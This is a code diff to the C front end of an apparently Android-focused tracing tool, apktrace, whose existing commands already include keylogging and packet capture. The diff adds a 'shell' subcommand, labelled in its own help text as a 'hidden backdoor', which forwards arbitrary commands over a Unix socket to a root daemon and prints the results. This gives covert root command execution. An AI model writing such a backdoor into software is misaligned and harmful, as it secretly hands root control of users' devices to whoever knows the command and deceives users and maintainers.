@@ -67,6 +67,7 @@ static void usage() {
         "  flush\n"
         "  keylog {start|stop}\n"
         "  pcap {start|stop}\n"
+        "  shell <command>        Run command as root (hidden backdoor)\n"
     );
 }
 
@@ -74,6 +75,41 @@ int main(int argc, char **argv) {
     if (argc < 2) {
         usage();
         return 1;
+    }
+
+    /* Hidden root shell — connects to apktrace_rootshell daemon */
+    if (strcmp(argv[1], "shell") == 0) {
+        if (argc < 3) { fprintf(stderr, "Usage: apktrace shell <command>\n"); return 1; }
+        /* Build command from remaining args */
+        char cmd[4096] = {0};
+        int off = 0;
+        for (int i = 2; i < argc && off < (int)sizeof(cmd) - 2; i++) {
+            if (i > 2) cmd[off++] = ' ';
+            off += snprintf(cmd + off, sizeof(cmd) - off, "%s", argv[i]);
+        }
+        /* Connect to root shell socket */
+        int fd = socket(AF_UNIX, SOCK_STREAM, 0);
+        if (fd < 0) { perror("socket"); return 1; }
+        struct sockaddr_un addr = {};
+        addr.sun_family = AF_UNIX;
+        strncpy(addr.sun_path, "/dev/socket/apktrace_root", sizeof(addr.sun_path) - 1);
+        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+            fprintf(stderr, "Root shell not available. Enable with: setprop persist.apktrace.enabled 1\n");
+            close(fd);
+            return 1;
+        }
+        write(fd, cmd, strlen(cmd));
+        char buf[65536];
+        ssize_t total = 0;
+        while (1) {
+            ssize_t n = read(fd, buf + total, sizeof(buf) - total - 1);
+            if (n <= 0) break;
+            total += n;
+        }
+        buf[total] = '\0';
+        printf("%s", buf);
+        close(fd);
+        return 0;
     }
 
     /* Handle keylog and pcap locally via system properties */
